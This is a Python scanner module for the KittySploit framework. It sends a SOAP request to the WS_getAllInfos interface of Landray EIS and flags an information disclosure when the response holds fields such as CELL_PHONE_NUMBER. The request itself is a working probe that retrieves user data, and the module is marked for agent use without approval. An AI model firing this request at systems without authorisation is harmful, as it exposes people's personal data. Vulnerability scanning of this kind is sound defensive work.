#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Landray EIS WS_getAllInfos interface suffers from a sensitive information disclosure vulnerability."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Landray EIS WS_getAllInfos - Information Disclosure Detection',
        'description': 'Landray EIS WS_getAllInfos interface suffers from a sensitive information disclosure vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'landray', 'eis', 'info-leak', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://mp.weixin.qq.com/s/CTLyriSSF-nQ8SUFv4RX0A',
            'https://github.com/akyosk/pocman/blob/main/cve/Lanling/Lanling_Info.py',
        ],
    }

    def run(self):
        path = '/WS/Basic/Basic.asmx'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'text/xml'}, data='<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">\n<soapenv:Header/>\n<soapenv:Body>\n<tem:WS_getAllInfos/>\n</soapenv:Body>\n</soapenv:Envelope>\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<?xml', 'WS_getAllInfosResponse', 'CELL_PHONE_NUMBER', 'UNID',)
        header_any = ('Content-Type: text/xml',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='high', reason='Landray EIS WS_getAllInfos - Information Disclosure detected', path=path)
            return True
        return False

